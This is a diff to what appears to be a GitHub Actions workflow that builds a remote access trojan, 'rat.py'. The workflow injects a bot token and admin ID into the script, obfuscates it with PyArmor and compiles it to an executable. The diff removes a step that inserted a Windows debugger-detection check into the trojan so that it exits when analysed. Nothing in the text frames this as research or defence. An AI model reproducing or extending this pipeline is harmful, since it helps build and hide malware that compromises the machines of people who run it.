@@ -37,57 +37,19 @@ jobs:
       - name: Replace token and admin_id in rat.py
         run: |
           python -c "
-          import re
-          with open('rat.py', 'r', encoding='utf-8') as f:
-              content = f.read()
-          content = content.replace('{{TOKEN}}', '${{ inputs.token }}')
-          content = content.replace('{{ADMIN_ID}}', '${{ inputs.admin_id }}')
-          with open('rat.py', 'w', encoding='utf-8') as f:
-              f.write(content)
-          "
-      
-      - name: Add anti-debug to rat.py
-        run: |
-          python -c "
-          import os
-          with open('rat.py', 'r', encoding='utf-8') as f:
-              content = f.read()
-          
-          anti_debug = '''
-import ctypes
-
-def check_debugger():
-    try:
-        if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
-            return True
-        return False
-    except:
-        return False
-
-if check_debugger():
-    sys.exit(0)
-'''
-          
-          lines = content.split('\n')
-          new_lines = []
-          imports_done = False
-          for line in lines:
-              new_lines.append(line)
-              if line.startswith('import ') or line.startswith('from '):
-                  imports_done = True
-              elif imports_done and line.strip() and not line.strip().startswith('#') and not line.strip().startswith('"""'):
-                  if 'check_debugger' not in content:
-                      new_lines.append(anti_debug)
-                  imports_done = False
-          
-          with open('rat.py', 'w', encoding='utf-8') as f:
-              f.write('\n'.join(new_lines))
-          "
+import re
+with open('rat.py', 'r', encoding='utf-8') as f:
+    content = f.read()
+content = content.replace('{{TOKEN}}', '${{ inputs.token }}')
+content = content.replace('{{ADMIN_ID}}', '${{ inputs.admin_id }}')
+with open('rat.py', 'w', encoding='utf-8') as f:
+    f.write(content)
+"
       
       - name: Obfuscate with PyArmor
         run: |
           pyarmor obfuscate --recursive rat.py
-          cp -r dist/rat.py rat_obf.py
+          cp dist/rat.py rat_obf.py
       
       - name: Build EXE with obfuscated code
         run: |
